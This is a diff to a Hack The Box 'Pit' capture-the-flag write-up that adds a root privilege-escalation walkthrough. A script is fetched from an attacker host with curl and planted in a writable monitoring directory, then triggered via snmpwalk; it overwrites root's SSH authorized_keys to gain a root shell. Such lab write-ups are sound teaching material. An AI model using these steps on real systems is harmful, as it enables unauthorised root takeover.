@@ -204,7 +204,7 @@ From the web terminal, we are then able to obtain the user flag.
 [michelle@pit ~]$ ls
 user.txt
 [michelle@pit ~]$ cat user.txt
-9f5f5195c48e73b42768dbf22c2f7a80
+<Redacted user flag>
 [michelle@pit ~]$ 
 ```
 
@@ -237,4 +237,104 @@ ls: cannot open directory '/usr/local/monitoring': Permission denied
 [michelle@pit ~]$ cat /usr/local/monitoring/check.sh
 cat: /usr/local/monitoring/check.sh: No such file or directory
 [michelle@pit ~]$ 
+```
+
+Next, we will have to try to obtain the file access permissions for ```/usr/local/monitoring```. From the output, we can see that the directory is owned by ```root``` and ```michelle``` is able to write and execute files in the directory.
+
+```
+[michelle@pit ~]$ getfacl /usr/local/monitoring
+getfacl: Removing leading '/' from absolute path names
+# file: usr/local/monitoring
+# owner: root
+# group: root
+user::rwx
+user:michelle:-wx
+group::rwx
+mask::rwx
+other::---
+```
+
+So, let's test out the hypothesis for the file by writing a file to the directory. However, we noticed that after a fixed time period, the file will be deleted.
+```
+[michelle@pit ~]$ echo "testfile" > /usr/local/monitoring/test.txt
+[michelle@pit ~]$ cat /usr/local/monitoring/test.txt
+testfile
+[michelle@pit ~]$ ls -la /usr/local/monitoring/test.txt
+-rw-rw-r--. 1 michelle michelle 9 Aug 19 11:24 /usr/local/monitoring/test.txt
+[michelle@pit ~]$ cat /usr/local/monitoring/test.txt
+cat: /usr/local/monitoring/test.txt: No such file or directory
+[michelle@pit ~]$ 
+```
+
+Now, let's first create a POC file, ```check.sh``` with the following contents:
+```
+#!/bin/bash
+ping 10.10.16.250
+```
+
+Afterwards we will curl the file and copy the file to the ```/usr/local/monitoring``` directory
+```
+michelle@pit ~]$ curl -O http://10.10.16.250:8000/check.sh
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    30  100    30    0     0     28      0  0:00:01  0:00:01 --:--:--    28
+[michelle@pit ~]$ cp check.sh /usr/local/monitoring
+[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
+#!/bin/bash
+
+ping 10.10.16.250[michelle@pit ~]$ cat /usr/local/monitoring/check.sh
+#!/bin/bash
+
+ping 10.10.16.250[michelle@pit ~]$ 
+```
+
+Next we will then execute ```/usr/bin/monitor``` script using ```snmpwalk```
+```
+┌──(kali㉿kali)-[~]
+└─$ snmpwalk -v 1 -c public 10.10.10.241 iso.3.6.1.4.1.8072.1.3.2.2.1                            1 ⚙
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
+iso.3.6.1.4.1.8072.1.3.2.2.1.3.10.109.111.110.105.116.111.114.105.110.103 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.4.10.109.111.110.105.116.111.114.105.110.103 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.5.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 5
+iso.3.6.1.4.1.8072.1.3.2.2.1.6.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.20.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 4
+iso.3.6.1.4.1.8072.1.3.2.2.1.21.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+```
+
+Our POC has proven to be worked as seen from the ping command that could be captured from WireShark
+![Wireshark traffic](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pit/ping_command.PNG)
+
+Now, we have to first create a key file using ```ssh-keygen```. Then, we will have to create our exploit file, ```check.sh``` with the following contents to add our public key to the ```root``` user's authorized keys so that we can SSH into the root user
+```
+#!/bin/bash
+
+echo "<SSH public keys>" > /root/.ssh/authorized_keys
+```
+
+As usual, we will have to curl the exploit file from our server and then copy it into the ```/usr/local/monitoring/``` directory. Afterwards, we will then execute the command at ```/usr/bin/monitor``` using ```snmpwalk``` and then we will SSH into the root user at 10.10.10.241 to obtain the root flag
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ snmpwalk -v 1 -c public 10.10.10.241 iso.3.6.1.4.1.8072.1.3.2.2.1                            1 ⚙
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
+iso.3.6.1.4.1.8072.1.3.2.2.1.3.10.109.111.110.105.116.111.114.105.110.103 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.4.10.109.111.110.105.116.111.114.105.110.103 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.5.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 5
+iso.3.6.1.4.1.8072.1.3.2.2.1.6.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.20.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 4
+iso.3.6.1.4.1.8072.1.3.2.2.1.21.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
+                                                                                                     
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh -i key root@10.10.10.241                                                                 1 ⚙
+The authenticity of host '10.10.10.241 (10.10.10.241)' can't be established.
+ECDSA key fingerprint is SHA256:N07IT3fGYgOB1uKAL/kctwXiIXEDS6kmuNno6+6uQts.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.241' (ECDSA) to the list of known hosts.
+Web console: https://pit.htb:9090/
+
+Last login: Mon Jul 26 06:58:15 2021
+[root@pit ~]# cat root.txt
+<Redacted root flag>
+[root@pit ~]# 
 ```
